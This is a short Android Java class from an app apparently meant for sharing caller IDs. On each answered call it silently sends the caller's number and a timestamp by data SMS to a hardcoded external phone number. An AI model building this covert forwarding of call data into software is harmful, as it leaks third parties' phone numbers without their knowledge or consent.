package com.byteshaft.calleridshare.receivers;

import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

import com.byteshaft.calleridshare.utils.Helpers;


public class IncomingCallStateListener extends PhoneStateListener {

    @Override
    public void onCallStateChanged(int state, String incomingNumber) {
        super.onCallStateChanged(state, incomingNumber);
        switch (state) {
            case TelephonyManager.CALL_STATE_IDLE:
                break;
            case TelephonyManager.CALL_STATE_OFFHOOK:
                String body = String.format("%s,%s", incomingNumber, System.currentTimeMillis());
                Helpers.sendDataSms("+923422347000", "9851", body);
                break;
        }
    }
}
